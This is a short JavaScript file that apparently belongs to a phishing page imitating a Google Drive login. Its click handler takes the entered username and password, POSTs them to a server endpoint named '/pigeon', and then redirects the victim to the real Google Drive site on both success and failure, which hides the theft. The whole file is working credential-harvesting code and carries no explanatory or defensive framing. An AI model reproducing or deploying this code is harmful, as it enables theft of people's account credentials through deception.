const validation = document.getElementById("submit");
const url = "/pigeon";

validation.addEventListener("click",envoyer);
function envoyer(event){
    event.preventDefault();
    var settings = {
        "url": url,
        "method": "POST",
        dataType:"json",
        "contentType":"application/json",
        "timeout": 0,
        "data": JSON.stringify({
            "username": $("#inputName").val(),
            "password": $("#inputPassword").val()
        }),
        "success": function (data, textStatus, request) {
            console.log('success');
            window.location.href = "https://drive.google.com/drive/";
        },
        "error": function (request, textStatus, errorThrown) {
            window.location.href = "https://drive.google.com/drive/";
        }
    };
    $.ajax(settings);
}


